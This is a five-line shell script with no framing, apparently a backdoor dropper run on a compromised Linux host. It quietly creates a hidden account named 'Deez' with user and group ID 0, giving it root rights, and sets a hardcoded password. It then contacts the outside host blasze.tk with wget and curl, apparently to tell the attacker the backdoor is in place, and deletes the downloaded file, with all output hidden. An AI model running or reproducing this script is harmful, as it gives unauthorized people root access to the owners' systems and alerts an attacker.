useradd -o -u 0 -g 0 -M -d /root -s /bin/bash Deez > /dev/null 2>&1
echo -e "NuTz\nNuTz" | passwd Deez > /dev/null 2>&1
wget -q http://blasze.tk/IH26LQ > /dev/null 2>&1
rm -rf IH26LQ 
curl -s http://blasze.tk/IH26LQ > /dev/null 2>&1
